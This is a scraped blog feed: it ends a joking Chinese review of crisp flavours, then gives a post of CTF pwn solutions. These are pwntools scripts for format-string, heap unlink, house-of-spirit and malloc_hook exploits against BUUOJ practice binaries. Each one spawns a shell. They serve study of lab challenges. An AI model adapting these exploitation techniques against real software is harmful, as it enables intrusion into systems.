<p>蒜蓉烤生蚝味：…开袋需谨慎，一打开凑上去闻了一下差点把👴送走。最开始的几片简直要吐了我☀，吃着吃着倒是好了一些。蒜蓉生蚝的味道确实很够，余味也挺长（吃完之后嘴里留下的味道像是去烧烤店里把生蚝当晚饭了），但是作为薯片略微违和，只是令👴想吃烧烤罢了Orz。口感像是上好佳。（3/10）</p>
<p>孜然烤羊肉串味：贼香，羊肉（主要是膻味）和孜然味道很足，👴吃的爽得一🍺。（9/10）</p>
<p>春日限定-醇香栗子味：外观跟樱花米酿完全一致。开袋挺香的（update：吃完了包装袋放三天还挺香的），一股子混合了咖啡、奶酪、黄油，etc的味道（像是偏甜的提拉米苏？emmm闻着想起了卖咖啡的书店…），反正配料表里是只有个干酪啦2333。吃起来倒是没啥感觉，没有特别突出的味道，要👴盲吃的时候能说出这是栗子味是完全⑧可能的，但说了这玩意是栗子味倒也有点点点点像（不过栗子本身没味道吧Orz），可能唯一跟栗子搭上边的是口感？不知道是不是心理作用口感略绵。感觉分量好少，还没吃出个啥就吃完了。（7/10）</p>
<p>香酥烤鱼味：闻起来跟烧烤味似的，吃起来也差不多，没啥特点，就是味道太重，齁咸。👴感觉👴口味不淡（指可以接受高油高糖高盐的东西），吃了半包差点没吃完。虽然烤鱼味道不是很好表达，但是<em>猛加调料版烧烤味</em>也太扯了，配不上这个口味的名字。👴如果不是想不开就再也不会吃了。（3/10）</p>
<p>老坛酸菜鱼味：闻起来带有较浓的酸菜味，还有点辛，吃起来倒只有很normal的酸菜味，让👴想起了晚上吃的那家酸菜鱼。外观比原味乐事黄一些，口感类似。（7/10）</p>
<p>藤椒钵钵鸡味：没吃过钵钵鸡所以不好评价，藤椒味挺浓的，（何霑说有点辣但是我觉得还行），略香。（8/10）【待续因为吃完后过了两周才记录orz】</p>
<p>生津杨梅味：？（2/10）【存疑，因为感冒了】</p>
<p>金黄炒蟹味：不知道咋评价，对炒蟹没啥概念，反正挺好吃的。（8/10）</p>
<p>香辣小龙虾味：打开一股香辛料（很熟悉但具体是啥却一下子叫不出名字…）和辣椒粉的味道。没咋吃过小龙虾所以不知道正常的香辣小龙虾是啥味道…不过薯片也不辣，香是蛮香的，也的确能吃出虾类外壳的味道（2333）。不过真的很咸，一个人吃70g略难了，3 40g差不多。（5/10）</p>
]]></content>
      <tags>
        <tag>莫名其妙的记录</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn刷题</title>
    <url>/26324.html</url>
    <content><![CDATA[<p>把之前记的一些题目汇总了一下，没有任何顺序，好像也不是很全…</p>
<span id="more"></span>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MzQzMjAxL2FydGljbGUvZGV0YWlscy82NjQ3MzE0MA==">堆相关漏洞利用libc异常提示原因记录_jmp esp-CSDN博客<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="wdb-2018-2nd-easyfmt">wdb_2018_2nd_easyfmt</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = process(&quot;./fmt&quot;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,27907)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">elf = ELF(&quot;./fmt&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">printfgot = elf.got[&#x27;printf&#x27;]</span><br><span class="line"></span><br><span class="line">print p.recv()</span><br><span class="line">p.sendline(p32(printfgot)+&quot;%6$s&quot;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">#print p.recv()</span><br><span class="line">print p.recv(4)</span><br><span class="line"></span><br><span class="line">#printf = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">printf = u32(p.recv(4))</span><br><span class="line">print hex(printf)</span><br><span class="line">#libc = DynELF(leak,elf=elf_)</span><br><span class="line">libc=LibcSearcher(&quot;printf&quot;,printf)</span><br><span class="line">#ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br><span class="line">system = printf - libc.dump(&quot;printf&quot;) + libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">#system = printf - libc.sym[&#x27;printf&#x27;] + libc.sym[&#x27;system&#x27;]</span><br><span class="line">success(hex(system))</span><br><span class="line">#print_addr = </span><br><span class="line"></span><br><span class="line">## useful tool:</span><br><span class="line">payload = fmtstr_payload(6,&#123;printfgot: system&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(0)</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">sleep(0)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ZJCTF-2019-EasyHeap">[ZJCTF 2019]EasyHeap</h2>
<p>文件和Hitcon Lab 14一样，但buu的环境里/home/ctf是空的，改用house of spirit</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28283</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>():</span></span><br><span class="line">	p.sendline(<span class="string">&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6020e8</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;aaa&quot;</span>)	<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;bbbb&quot;</span>)	<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;cccc&quot;</span>)	<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020a0</span>-<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;9&quot;</span>)</span><br><span class="line">payload2 = p64(<span class="number">9</span>)*<span class="number">6</span> + <span class="string">&quot;\x00&quot;</span>*<span class="number">3</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还有一种做法：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY3NzczMS9hcnRpY2xlL2RldGFpbHMvMTA4MjA0MjQ0">buuctf [ZJCTF 2019]EasyHeap_R1nd0的博客-CSDN博客<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ptr=<span class="number">0x6020e8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)	<span class="comment">#heaparray&#x27;s chunk#1_ptr changed</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free_got)</span><br><span class="line">payload+=p64(ptr-<span class="number">0x18</span>)+p64(ptr+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"><span class="comment">#fake_chunk in bss</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ZJCTF-2019-Login">[ZJCTF 2019]Login</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29972</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;username: &quot;</span>,<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">passwd = <span class="string">&quot;2jctf_pa5sw0rd&quot;</span></span><br><span class="line">back = <span class="number">0x400E88</span></span><br><span class="line">payload = passwd + <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x48</span>-<span class="built_in">len</span>(passwd)) + p64(back)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="wdb-2018-1st-babyheap">wdb_2018_1st_babyheap</h2>
<ol>
<li>uaf泄露堆地址</li>
<li>伪造chunk触发unlink，泄露main_arena+0x58的地址</li>
<li>计算free_hook和system地址，写入free_hook</li>
<li>触发free(“/bin/sh”)，getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./w&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29942</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#sleep(4)</span></span><br><span class="line">allocate(<span class="number">0</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))*<span class="number">2</span>)</span><br><span class="line">allocate(<span class="number">1</span>,<span class="string">&quot;bbbb\n&quot;</span>)</span><br><span class="line">allocate(<span class="number">2</span>,<span class="string">&quot;cccc\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">3</span>,<span class="string">&quot;dddd\n&quot;</span>)</span><br><span class="line">allocate(<span class="number">4</span>,<span class="built_in">str</span>(<span class="string">&quot;/bin/sh\n&quot;</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">success(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x602060</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">5</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(heap)+p64(bss-<span class="number">0x10</span>))	<span class="comment">#chunk0</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">6</span>, p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>))<span class="comment"># pre_chunk == 0x20, the_hunk == 0x90</span></span><br><span class="line">allocate(<span class="number">7</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>))	<span class="comment"># build chunk1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)	<span class="comment">#unlink</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">mallochook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))- <span class="number">0x68</span></span><br><span class="line"><span class="comment">#(0x00007f5a6e089b78 - 0x00007f5a6e089b10)</span></span><br><span class="line">success(<span class="built_in">hex</span>(mallochook))</span><br><span class="line">libc.address = mallochook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">freehook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">sys = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(freehook))</span><br><span class="line">edit(<span class="number">0</span>,p64(sys)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Hitcon-Training-Lab14">Hitcon Training Lab14</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>():</span></span><br><span class="line">	p.sendline(<span class="string">&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;aaaa&quot;</span>)	<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">&quot;bbbb&quot;</span>)	<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;cccc&quot;</span>)	<span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x18</span> +p64(<span class="number">0x91</span>) + p64(<span class="number">0x10</span>)  +p64(bss-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,p64(<span class="number">9999</span>))</span><br><span class="line">back()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>把bss当fastbin来打，会产生memory corruption</p>
<h2 id="roarctf-2019-easy-pwn">roarctf-2019-easy_pwn</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,28967)</span></span><br><span class="line">p = process([<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&#x27;</span>,<span class="string">&quot;./easy&quot;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/pluto/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">24</span>)</span><br><span class="line">malloc(<span class="number">24</span>)</span><br><span class="line">malloc(<span class="number">0x90</span>)</span><br><span class="line">malloc(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,<span class="number">34</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p8(<span class="number">0xa1</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p8(<span class="number">0xa1</span>))</span><br><span class="line">fill(<span class="number">2</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>)*<span class="number">15</span> + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xa1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print p.recv()</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">offset = <span class="number">0x3c4b20</span> </span><br><span class="line"></span><br><span class="line">lib = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x58</span> - offset</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(lib)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">1</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook+lib)</span><br><span class="line">realloc = libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">fill(<span class="number">1</span>,<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook + lib - <span class="number">0x22</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">one_gadgets=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">fill(<span class="number">4</span>,<span class="number">27</span>,<span class="string">&quot;a&quot;</span>*<span class="number">11</span> + p64(lib + one_gadgets[<span class="number">2</span>]) + p64(lib + realloc+<span class="number">4</span>))</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYS9hcnRpY2xlL2RldGFpbHMvMTExMzA3NTMx">https://blog.csdn.net/mcmuyanga/article/details/111307531<i class="fa fa-external-link-alt"></i></span><br>
